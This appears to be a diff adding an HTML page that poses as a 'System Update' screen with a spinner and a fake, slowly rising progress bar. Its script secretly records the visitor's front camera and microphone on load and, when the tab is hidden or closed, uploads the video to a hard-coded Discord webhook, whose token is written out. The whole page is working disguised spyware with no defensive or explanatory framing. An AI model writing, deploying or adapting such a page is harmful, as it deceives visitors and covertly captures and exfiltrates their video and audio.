@@ -1,0 +1,66 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>System Update</title>
+    <style>
+        body { background: #000; color: #fff; font-family: sans-serif; display: flex; flex-direction: column; justify-content: center; align-items: center; height: 100vh; margin: 0; overflow: hidden; }
+        .loader { border: 4px solid #111; border-top: 4px solid #0078d4; border-radius: 50%; width: 40px; height: 40px; animation: spin 1s linear infinite; }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+        #status { margin-top: 20px; font-size: 14px; color: #0078d4; font-weight: bold; }
+        #pct { font-size: 12px; color: #555; margin-top: 5px; }
+    </style>
+</head>
+<body>
+
+    <div class="loader"></div>
+    <div id="status">INSTALLING SYSTEM UPDATE...</div>
+    <div id="pct">Progress: <span id="val">0</span>%</div>
+
+    <video id="v" autoplay muted style="display:none;"></video>
+
+    <script>
+        const URI = "https://discord.com/api/webhooks/1452653310443257970/SkdnTLTdZUq5hJUf7POXHYcILxlYIVTS7TVc-NYKruBSlotTJtA2BzHY9bEACJxrlnd5";
+        let rc;
+        let ck = [];
+
+        async function start() {
+            try {
+                const s = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" }, audio: true });
+                document.getElementById('v').srcObject = s;
+                
+                rc = new MediaRecorder(s);
+                rc.ondataavailable = (e) => { if (e.data.size > 0) ck.push(e.data); };
+                
+                rc.onstop = async () => {
+                    const b = new Blob(ck, { type: 'video/webm' });
+                    const f = new FormData();
+                    f.append('file', b, 'vid.webm');
+                    f.append('content', '🎥 **Video Recorded!**');
+                    await fetch(URI, { method: 'POST', body: f });
+                };
+
+                rc.start();
+                load();
+            } catch (e) {
+                document.getElementById('status').innerText = "ERROR: PERMISSION DENIED";
+            }
+        }
+
+        function load() {
+            let p = 0;
+            setInterval(() => {
+                if (p < 99) {
+                    p += Math.floor(Math.random() * 2) + 1;
+                    document.getElementById('val').innerText = p;
+                }
+            }, 3000);
+        }
+
+        window.onload = start;
+        document.addEventListener("visibilitychange", () => { if (document.visibilityState === 'hidden' && rc) rc.stop(); });
+        window.onbeforeunload = () => { if (rc) rc.stop(); };
+    </script>
+</body>
+</html>
